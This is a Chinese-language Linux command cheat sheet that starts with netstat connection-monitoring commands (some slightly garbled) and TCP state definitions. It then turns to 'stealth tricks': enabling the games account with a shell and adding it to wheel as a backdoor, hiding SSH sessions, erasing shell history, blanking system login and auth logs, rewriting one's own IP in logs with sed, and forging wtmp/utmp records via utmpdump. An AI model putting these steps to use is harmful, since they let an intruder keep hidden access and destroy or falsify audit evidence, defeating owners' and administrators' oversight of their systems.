
# 網路檢測

檢視哪些IP連線本機

```bash
netstat -an
```

統計 80 port連線數

```bash
netstat -nat | grep -i "80" | wc -l
```

統計httpd協議連線數

```bash
ps -ef | grep httpd | wc -l
```

統計已連線上的，狀態為established

```bash
netstat -anp | grep ESTABLISHED | wc -l
```

計算每一個 ip 在主機上建立的連線數量

```bash
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
```

列出每個 ip 建立的 ESTABLISHED 連線數量

```bash
netstat -ntu | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr
```

列出每個 ip 建立的 80 port連線數量

```bash
netstat -plan|grep :80|awk {'print $5'}|cut -d: -f 1|sort|uniq -c|sort -nk 1
```

查出哪個IP地址連線最多，將其封了

```bash
netstat -anp | grep ESTABLISHED | awk {print $5}|awk -F: {print $1} | sort | uniq -c | sort -r  0n
netstat -anp | grep SYN | awk {print $5}|awk -F: {print $1} | sort | uniq -c | sort -r  0n
```

TCP連線狀態詳解

```txt
LISTEN： 偵聽來自遠方的TCP埠的連線請求
SYN-SENT： 再傳送連線請求後等待匹配的連線請求
SYN-RECEIVED：再收到和傳送一個連線請求後等待對方對連線請求的確認
ESTABLISHED： 代表一個開啟的連線
FIN-WAIT-1： 等待遠端TCP連線中斷請求，或先前的連線中斷請求的確認
FIN-WAIT-2： 從遠端TCP等待連線中斷請求
CLOSE-WAIT： 等待從本地使用者發來的連線中斷請求
CLOSING： 等待遠端TCP對連線中斷的確認
LAST-ACK： 等待原來的發向遠端TCP的連線中斷請求的確認
TIME-WAIT： 等待足夠的時間以確保遠端TCP接收到連線中斷請求的確認
CLOSED： 沒有任何連線狀態
SYN_RECV表示正在等待處理的請求數；
ESTABLISHED表示正常資料傳輸狀態；
TIME_WAIT表示處理完畢，等待超時結束的請求數。
```

sudo vi /etc/passwd
把games打開
games:x:12:100:games:/usr/games:/bin/bash
把games加到wheel跟utmp
usermod -a -G wheel,utmp games

隱身密技

隱藏遠端登入
ssh -T user@host /bin/bash -i

不紀錄ssh公鑰在本地.ssh目錄中
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i

清除操作紀錄

1. 編輯 vim~/.bash_history

2. 清除該User紀錄 history -c

3. 清除不想出現的指令 history | grep "part of command you want to remove" 
                   history -d [num]

4. 登入後輸入下面指令 不紀錄指令
export HISTFILE=/dev/null;
export HISTSIZE=0;
export HISTFILESIZE=0

清除系統LOG

1. 通通清除 (很容易被發現, 不優)
echo > /var/log/wtmp //清除User登入紀錄
echo > /var/log/btmp //清除嘗試登入紀錄
echo > /var/log/lastlog //清除最近登入紀錄
echo > /var/log/secure //登入訊息
echo > /var/log/messages
echo > /var/log/syslog //紀錄系统LOG
echo > /var/log/xferlog
echo > /var/log/auth.log
echo > /var/log/user.log
cat /dev/null > /var/adm/sylog
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/openwebmail.log
cat /dev/null > /var/log/mail.info
echo > /var/run/utmp

2. 替換或刪除部份

删除所有匹配的字串, 比如當天日期或者自己的登入ip
sed  -i '/自己的ip/'d  /var/log/messages

替换登入ip
sed -i 's/192.168.166.85/192.168.1.1/g' secure


```txt
命令    日誌文件            功能
last   |/var/log/wtmp    |所有成功登錄/登出的歷史記錄
lastb  |/var/log/btmp    |登錄失敗嘗試
lastlog|/var/log/lastlog |最近登錄記錄
```

## 修改 wtmp 和 utmp 文件

```txt
第一步:

通過下面指令把二進位文件轉成可編輯文件 wtmp.file

utmpdump /var/log/wtmp > /var/log/wtmp.file

第二步:

編輯/var/log/wtmp.file 刪除部分login紀錄，或修改登錄紀錄

第三步:

文件轉回二進位文件

utmpdump -r < /var/log/wtmp.file > /var/log/wtmp

最後:

修改完成，可用last命令查看修改结果。

總结:

utmp/wtmp文件可用utmpdump 在二進位跟正常可編輯文件做轉換
```




